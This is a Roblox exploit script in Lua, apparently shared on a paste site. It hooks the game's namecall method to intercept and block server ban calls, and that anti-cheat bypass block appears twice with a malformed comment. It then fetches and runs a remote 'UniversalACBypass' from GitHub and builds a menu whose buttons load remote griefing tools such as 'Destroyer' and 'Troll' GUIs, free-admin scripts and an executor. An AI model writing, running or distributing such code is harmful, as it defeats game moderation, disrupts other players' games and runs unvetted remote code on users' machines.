local X;
X = hookmetamethod(game, "__namecall", function(self, ...)
   if getnamecallmethod() == "Ban" then
       local eval1 = {false}
       local eval2 = {false}
       local args = {...}
       if debug.validlevel(3) and self.Parent == nil then
           local stack = debug.getstack(3)
           local counter = 0
           local expected;
           for i,v in pairs(stack) do
               if v == game.Players.LocalPlayer.Name or v == "Ban" or v == "Packet" or v == "Network" then
                   counter = counter + 1
               elseif type(v) == "number" then
                   if type(expected) == "number" then
                       expected = expected + v
                   else
                       expected = v
                   end
               end
           end
           if counter == expected then
               eval1 = {true, counter+5}
           end
       end
       if eval1[1] then
           if #args == eval1[2] then
               local counter = 0
               local outgoingkey;
               for i,v in pairs(args) do
                   if v == game.Players.LocalPlayer.Name or v == "Ban" or v == "Packet" or v == "Network" then
                       counter = counter + 1
                   elseif tostring(i) == "userdata: 0x000000001bdfb8ea" then
                       outgoingkey = v
                   end
                   if counter == eval1[2] then
                       eval2 = {true, outgoingkey}
                   end
               end
           end
           if eval2[1] then
               game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0, outgoingkey)  ban packets (requires outgoing key to set it to 0)
               game.Players.LocalPlayer:Kick("Game attempted to ban you but was blocked")
               return wait(9e9)
           end
       end
   end
   return X(self, ...)
end) local X;
X = hookmetamethod(game, "__namecall", function(self, ...)
   if getnamecallmethod() == "Ban" then
       local eval1 = {false}
       local eval2 = {false}
       local args = {...}
       if debug.validlevel(3) and self.Parent == nil then
           local stack = debug.getstack(3)
           local counter = 0
           local expected;
           for i,v in pairs(stack) do
               if v == game.Players.LocalPlayer.Name or v == "Ban" or v == "Packet" or v == "Network" then
                   counter = counter + 1
               elseif type(v) == "number" then
                   if type(expected) == "number" then
                       expected = expected + v
                   else
                       expected = v
                   end
               end
           end
           if counter == expected then
               eval1 = {true, counter+5}
           end
       end
       if eval1[1] then
           if #args == eval1[2] then
               local counter = 0
               local outgoingkey;
               for i,v in pairs(args) do
                   if v == game.Players.LocalPlayer.Name or v == "Ban" or v == "Packet" or v == "Network" then
                       counter = counter + 1
                   elseif tostring(i) == "userdata: 0x000000001bdfb8ea" then
                       outgoingkey = v
                   end
                   if counter == eval1[2] then
                       eval2 = {true, outgoingkey}
                   end
               end
           end
           if eval2[1] then
               game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0, outgoingkey)  packets (requires outgoing key to set it to 0)
               game.Players.LocalPlayer:Kick("Game attempted to ban you but was blocked")
               return wait(9e9)
           end
       end
   end
   return X(self, ...)
end) loadstring(game:HttpGet("https://raw.githubusercontent.com/Next1x/Nextix./main/UniversalACBypass"))() local c00lgui = Window:Creat




eTab("c00lgui", nil) -- Title, Image
local c00lguiSection = c00lgui:CreateSection("c00lgui")

local Button = c00lgui:CreateButton({
   Name = "c00lgui v2.2 by team c00lkidd",
   Callback = function()
        loadstring(game:HttpGet("https://[Log in to view URL]",true))()
   end,
})

local Button = c00lgui:CreateButton({
   Name = "Destroyer GUI",
   Callback = function()
        loadstring(game:HttpGet("https://[Log in to view URL]",true))()
   end,
})

local Button = c00lgui:CreateButton({
   Name = "c00lgui reborn v0.5",
   Callback = function()
        loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
   end,
})

local feTab = Window:CreateTab("Fe Bypass", nil) -- Title, Image
local feSection = feTab:CreateSection("Fe Bypass")

local Paragraph = feTab:CreateParagraph({Title = "NOTICE", Content = "Some FE script can doesn't work if they don't work contact me FireServiceScripter#1073 on discord"})

local Button = feTab:CreateButton({
   Name = "FE GAMEPASS UI",
   Callback = function()
        loadstring(game:HttpGet('https://[Log in to view URL]'))()
   end,
})

local Button = feTab:CreateButton({
   Name = "FE Twilight Daycare Destroyer",
   Callback = function()
        loadstring(game:HttpGet('https://[Log in to view URL]'))(' Watermelon ? ')
   end,
})

local Button = feTab:CreateButton({
   Name = "FE Build And Survive Destroyer",
   Callback = function()
        loadstring(game:HttpGet('https://[Log in to view URL]'))()
   end,
})

local Button = feTab:CreateButton({
   Name = "FE Bypassing Hub GUI",
   Callback = function()
        loadstring(game:HttpGet("https://[Log in to view URL]"))()
   end,
})

local Button = feTab:CreateButton({
   Name = "FE Tools Drop [FREE ADMIN]",
   Callback = function()
        loadstring(game:HttpGet('https://[Log in to view URL]'))()
   end,
})

local Button = feTab:CreateButton({
   Name = "FE Troll GUI",
   Callback = function()
        loadstring(game:HttpGet("https://[Log in to view URL]"))()
   end,
})

local Button = feTab:CreateButton({
   Name = "FE Btools",
   Callback = function()
        loadstring(game:HttpGet('https://[Log in to view URL]'))()
    end,
    })

local Button = feTab:CreateButton({
   Name = "FE Hub Script [Best]",
   Callback = function()
        loadstring(game:HttpGet('https://[Log in to view URL]'))()
   end,
})

local Executors = Window:CreateTab("Executors", nil) -- Title, Image
local ExSection = Executors:CreateSection("RC7")

local Button = Executors:CreateButton({
   Name = "RC7",
   Callback = function()
        loadstring(game:HttpGet("https://[Log in to view URL]"))()
   end,
})